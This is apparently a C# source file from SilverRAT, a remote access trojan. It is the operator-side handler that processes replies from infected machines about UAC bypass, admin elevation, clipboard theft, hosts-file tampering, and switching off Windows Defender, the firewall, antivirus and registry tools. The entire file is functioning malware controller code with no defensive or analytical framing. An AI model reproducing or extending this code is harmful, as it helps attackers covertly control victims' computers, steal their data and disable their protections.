using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.MessagePack;
using System.Drawing;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleOptions
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "RunAs":
                    {
                        Options options4 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options4 != null)
                        {
                            if (unpack_msgpack.ForcePathObject("RunAs").AsString == "Yes")
                            {
                                options4.RunAsadminstartor.Enabled = false;
                            }
                            else
                            {
                                options4.RunAsadminstartor.Enabled = true;
                            }
                        }
                        break;
                    }
                case "BypassUAC":
                    {
                        Options options11 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options11 != null)
                        {
                            if (unpack_msgpack.ForcePathObject("BypassUAC").AsString == "Yes")
                            {
                                options11.guna2GradientButton_3.Enabled = false;
                            }
                            else
                            {
                                options11.guna2GradientButton_3.Enabled = true;
                            }
                        }
                        break;
                    }
                case "Clipboar":
                    {
                        Options options8 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options8 != null)
                        {
                            options8.richTextBoxClipboard.Text = unpack_msgpack.ForcePathObject("Paste").AsString;
                        }
                        break;
                    }
                case "LogsHosts":
                    {
                        Options options3 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options3 != null)
                        {
                            string asString = unpack_msgpack.ForcePathObject("Message").AsString;
                            if (asString.Contains("Error"))
                            {
                                options3.LogsHosts.Text = asString;
                                options3.LogsHosts.ForeColor = Color.Red;
                            }
                            else
                            {
                                options3.LogsHosts.Text = "Saved successfully";
                                options3.LogsHosts.ForeColor = Color.Green;
                            }
                            if (!options3.SaveHosts.Enabled)
                            {
                                options3.SaveHosts.Enabled = true;
                            }
                            if (!options3.RefreshHosts.Enabled)
                            {
                                options3.RefreshHosts.Enabled = true;
                            }
                        }
                        break;
                    }
                case "ErrorAdmin":
                    {
                        Options options5 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options5 != null)
                        {
                            options5.StateAdmin.ForeColor = Color.Red;
                            options5.StateAdmin.Text = unpack_msgpack.ForcePathObject("Error").AsString;
                        }
                        break;
                    }
                case "logsDotNET":
                    {
                        Options options6 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options6 != null)
                        {
                            string asString2 = unpack_msgpack.ForcePathObject("Message").AsString;
                            if (asString2.Contains("Error!"))
                            {
                                options6.LogsNET.ForeColor = Color.Red;
                            }
                            else
                            {
                                options6.LogsNET.ForeColor = Color.Green;
                            }
                            options6.LogsNET.Text = asString2;
                        }
                        break;
                    }
                case "Index":
                    {
                        Options options10 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options10 == null)
                        {
                            break;
                        }
                        if (bool.Parse(unpack_msgpack.ForcePathObject("Message").AsString))
                        {
                            if (!options10.StopIndex.Enabled)
                            {
                                options10.StopIndex.Enabled = true;
                            }
                            if (options10.StardIndex.Enabled)
                            {
                                options10.StardIndex.Enabled = false;
                            }
                            options10.StateIndex.ForeColor = Color.Green;
                            options10.StateIndex.Text = "Started";
                        }
                        else
                        {
                            if (options10.StopIndex.Enabled)
                            {
                                options10.StopIndex.Enabled = false;
                            }
                            if (!options10.StardIndex.Enabled)
                            {
                                options10.StardIndex.Enabled = true;
                            }
                            options10.StateIndex.ForeColor = Color.Red;
                            options10.StateIndex.Text = "Stoped";
                        }
                        break;
                    }
                case "WriteHosts":
                    {
                        Options options2 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options2 != null)
                        {
                            options2.TextHosts.Clear();
                            options2.TextHosts.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            if (!options2.SaveHosts.Enabled)
                            {
                                options2.SaveHosts.Enabled = true;
                            }
                            if (!options2.RefreshHosts.Enabled)
                            {
                                options2.RefreshHosts.Enabled = true;
                            }
                        }
                        break;
                    }
                case "Controol":
                    {
                        Options options9 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options9 != null)
                        {
                            if (!options9.DisabledWD.Enabled)
                            {
                                options9.DisabledWD.Enabled = true;
                            }
                            if (!options9.DisabledFirewall.Enabled)
                            {
                                options9.DisabledFirewall.Enabled = true;
                            }
                            if (!options9.EnabledFirewall.Enabled)
                            {
                                options9.EnabledFirewall.Enabled = true;
                            }
                            if (!options9.DisabledAnti.Enabled)
                            {
                                options9.DisabledAnti.Enabled = true;
                            }
                            if (!options9.EnabledAnti.Enabled)
                            {
                                options9.EnabledAnti.Enabled = true;
                            }
                            if (!options9.guna2GradientButton_1.Enabled)
                            {
                                options9.guna2GradientButton_1.Enabled = true;
                            }
                            if (!options9.guna2GradientButton_0.Enabled)
                            {
                                options9.guna2GradientButton_0.Enabled = true;
                            }
                            if (!options9.DisabledRegistry.Enabled)
                            {
                                options9.DisabledRegistry.Enabled = true;
                            }
                            if (!options9.EnabledRegistry.Enabled)
                            {
                                options9.EnabledRegistry.Enabled = true;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "AddUAC":
                    {
                        Options options7 = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options7 != null)
                        {
                            if (unpack_msgpack.ForcePathObject("AddUAC").AsString == "Yes")
                            {
                                options7.AddUAC.Enabled = false;
                                options7.guna2GradientButton_2.Enabled = true;
                            }
                            else if (unpack_msgpack.ForcePathObject("AddUAC").AsString == "YesAdmin")
                            {
                                options7.AddUAC.Enabled = true;
                                options7.guna2GradientButton_2.Enabled = false;
                            }
                            else if (unpack_msgpack.ForcePathObject("AddUAC").AsString == "NoAdmin")
                            {
                                options7.AddUAC.Enabled = false;
                                options7.guna2GradientButton_2.Enabled = false;
                            }
                            else if (unpack_msgpack.ForcePathObject("AddUAC").AsString == "No")
                            {
                                options7.AddUAC.Enabled = true;
                                options7.guna2GradientButton_2.Enabled = false;
                                options7.StateAdmin.ForeColor = Color.Red;
                                options7.StateAdmin.Text = "task adding failed...";
                            }
                            else if (unpack_msgpack.ForcePathObject("AddUAC").AsString == "State")
                            {
                                options7.StateAdmin.ForeColor = Color.Green;
                                options7.StateAdmin.Text = "task has been added successfully";
                            }
                        }
                        break;
                    }
                case "Actived":
                    {
                        Options options = (Options)Application.OpenForms["OptionsForm:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (options != null)
                        {
                            if (options.Client == null)
                            {
                                options.Client = client;
                                options.LoaderConnect.Visible = false;
                                options.Timer1.Start();
                                options.Admin = bool.Parse(unpack_msgpack.ForcePathObject("Admin").AsString);
                                if (options.Admin)
                                {
                                    options.InfoAdmin.Text = "Active";
                                    options.InfoAdmin.ForeColor = Color.LimeGreen;
                                }
                                else
                                {
                                    options.InfoAdmin.Text = "Inactive";
                                    options.InfoAdmin.ForeColor = Color.Red;
                                }
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
